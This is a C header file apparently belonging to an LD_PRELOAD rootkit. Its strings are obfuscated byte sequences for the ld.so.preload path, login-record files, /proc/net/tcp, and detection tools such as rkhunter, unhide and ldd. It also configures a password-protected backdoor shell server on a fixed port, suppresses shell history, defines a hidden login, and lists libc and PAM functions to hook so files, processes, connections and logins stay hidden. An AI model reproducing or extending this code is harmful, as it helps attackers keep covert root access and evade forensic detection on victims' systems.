#define _GNU_SOURCE
#pragma once
//#define DEBUG_APP
#ifdef DEBUG_APP
#define DEBUG(...) fprintf(stderr, __VA_ARGS__);
#else
#define DEBUG(...)
#endif

#define MAGIC_STRING	"__"
#define CONFIG_FILE	"\x92\x9a\xd0\x8d\x91\xd0\x8e\x8c\x9b\x92\x91\x9f\x9a"
#define BIN_FILE	"\x92\x97\x9c\x8d\x96\x8d\x9b\x8c\x88\x9b\x8c"
#define WTMP_FILE_X	"\xd1\x88\x9f\x8c\xd1\x92\x91\x99\xd1\x89\x8a\x93\x8e"
#define UTMP_FILE_X	"\xd1\x88\x9f\x8c\xd1\x8c\x8b\x90\xd1\x8b\x8a\x93\x8e"
#define SYS_WRITE	"\x89\x8c\x97\x8a\x9b"
#define SYS_READ	"\x8c\x9b\x9f\x9a"
#define PROC_PATH	"\xd1\x8e\x8c\x91\x9d\xd1"
#define ANTI_DEBUG_MSG	"\xba\x91\x90\xd9\x8a\xde\x8d\x9d\x8c\x9f\x8a\x9d\x96\xde\x8a\x96\x9b\xde\x89\x9f\x92\x92\x8d\xdf"

#define C_RKHUNTER	"\xd1\x9c\x97\x90\xd1\x8c\x95\x96\x8b\x90\x8a\x9b\x8c"
#define C_UNHIDE	"\xd1\x9c\x97\x90\xd1\x8b\x90\x96\x97\x9a\x9b"
#define C_LDD	"\xd1\x9c\x97\x90\xd1\x92\x9a\x9a"
#define LD_LINUX	"\x92\x9a\xd3\x92\x97\x90\x8b\x86"
#define LD_TRACE	"\xb2\xba\xa1\xaa\xac\xbf\xbd\xbb\xa1\xb2\xb1\xbf\xba\xbb\xba\xa1\xb1\xbc\xb4\xbb\xbd\xaa\xad"
#define LD_NORMAL	"\xd1\x9b\x8a\x9d\xd1\x92\x9a\xd0\x8d\x91\xd0\x8e\x8c\x9b\x92\x91\x9f\x9a"
#define LD_HIDE	"\xd1\x9b\x8a\x9d\xd1\x95\x9b\x8c\x90\x9b\x92\x8d\x96\x8d\x9b\x8c\x88\x9b\x8c"

#define PROC_NET_TCP	"\xd1\x8e\x8c\x91\x9d\xd1\x90\x9b\x8a\xd1\x8a\x9d\x8e"
#define PROC_NET_TCP6	"\xd1\x8e\x8c\x91\x9d\xd1\x90\x9b\x8a\xd1\x8a\x9d\x8e\xc8"
#define SCANF_LINE	"\xdb\x9a\xc4\xde\xdb\xc8\xca\xa5\xce\xd3\xc7\xbf\xd3\xb8\x9f\xd3\x98\xa3\xc4\xdb\xa6\xde\xdb\xc8\xca\xa5\xce\xd3\xc7\xbf\xd3\xb8\x9f\xd3\x98\xa3\xc4\xdb\xa6\xde\xdb\xa6\xde\xdb\x92\xa6\xc4\xdb\x92\xa6\xde\xdb\xa6\xc4\xdb\x92\xa6\xde\xdb\x92\xa6\xde\xdb\x9a\xde\xdb\x9a\xde\xdb\x92\x8b\xde\xdb\xcb\xcf\xcc\x8d\xf4"

#define SHELL_TYPE	"\xd1\x9c\x97\x90\xd1\x8d\x96"
#define SHELL_MSG	"\xa9\x9b\x92\x9d\x91\x93\x9b\xde\x8a\x91\xde\x8a\x96\x9b\xde\x8d\x96\x9b\x92\x92\xdf\xf4"
#define SHELL_PASSWD	"\x96\x9f\x96\x9f\x96\x9f"
#define SHELL_SERVER	"\x8d\x96\x9b\x92\x92\x8d\x9b\x8c\x88\x9b\x8c"
#define HIDE_TERM_VAR	"\xb6\xb7\xba\xbb\xa1\xaa\xb6\xb7\xad\xa1\xad\xb6\xbb\xb2\xb2\xc3\x98\x91\x91\x9c\x9f\x8c"
#define HIDE_TERM_STR	"\xb6\xb7\xba\xbb\xa1\xaa\xb6\xb7\xad\xa1\xad\xb6\xbb\xb2\xb2"
#define HIST_FILE	"\xb6\xb7\xad\xaa\xb8\xb7\xb2\xbb\xc3\xd1\x9a\x9b\x88\xd1\x90\x8b\x92\x92"
#define TERM	"\xaa\xbb\xac\xb3\xc3\x86\x8a\x9b\x8c\x93"
#define CMD_PROC_NAME	"\xd1\x8e\x8c\x91\x9d\xd1\xdb\x9a\xd1\x8d\x8a\x9f\x8a\x8b\x8d"

#define BLIND_LOGIN	"\x8c\x97\x9d\x95"
#define C_ROOT	"\x8c\x91\x91\x8a"

#define MAX_LEN 1024

#define SHELL_SERVER_PORT	44929
#define SRC_LOW_PORT	47001
#define SRC_HIGH_PORT	52001

#define O_RDWR 02
#define O_RDONLY 00

#define SYS_ACCESS 0
#define SYS_READDIR 1
#define SYS_FOPEN 2
#define SYS_OPENDIR 3
#define SYS_OPEN 4
#define SYS_RMDIR 5
#define SYS_LINK 6
#define SYS_UNLINK 7
#define SYS_UNLINKAT 8
#define SYS_RENAME 9
#define SYS_MKDIR 10
#define SYS_MKDIRAT 11
#define SYS_XSTAT 12
#define SYS_LXSTAT 13
#define SYS_PCAP_LOOP 14
#define SYS_EXECVE 15
#define SYS_PAM_AUTHENTICATE 16
#define SYS_PAM_OPEN_SESSION 17
#define SYS_GETPWNAM 18
#define SYS_GETPWNAM_R 19
#define SYS_PAM_ACCT_MGMT 20

#define SYSCALL_SIZE 21

static char *syscall_table[SYSCALL_SIZE] = {

"\x9f\x9d\x9d\x9b\x8d\x8d", "\x8c\x9b\x9f\x9a\x9a\x97\x8c", "\x98\x91\x8e\x9b\x90", "\x91\x8e\x9b\x90\x9a\x97\x8c", "\x91\x8e\x9b\x90", "\x8c\x93\x9a\x97\x8c", "\x92\x97\x90\x95", "\x8b\x90\x92\x97\x90\x95", "\x8b\x90\x92\x97\x90\x95\x9f\x8a", "\x8c\x9b\x90\x9f\x93\x9b", "\x93\x95\x9a\x97\x8c", "\x93\x95\x9a\x97\x8c\x9f\x8a", "\x8d\x8a\x9f\x8a", "\x92\x8d\x8a\x9f\x8a", "\x8e\x9d\x9f\x8e\xa1\x92\x91\x91\x8e", "\x9b\x86\x9b\x9d\x88\x9b", "\x8e\x9f\x93\xa1\x9f\x8b\x8a\x96\x9b\x90\x8a\x97\x9d\x9f\x8a\x9b", "\x8e\x9f\x93\xa1\x91\x8e\x9b\x90\xa1\x8d\x9b\x8d\x8d\x97\x91\x90", "\x99\x9b\x8a\x8e\x89\x90\x9f\x93", "\x99\x9b\x8a\x8e\x89\x90\x9f\x93\xa1\x8c", "\x8e\x9f\x93\xa1\x9f\x9d\x9d\x8a\xa1\x93\x99\x93\x8a"};
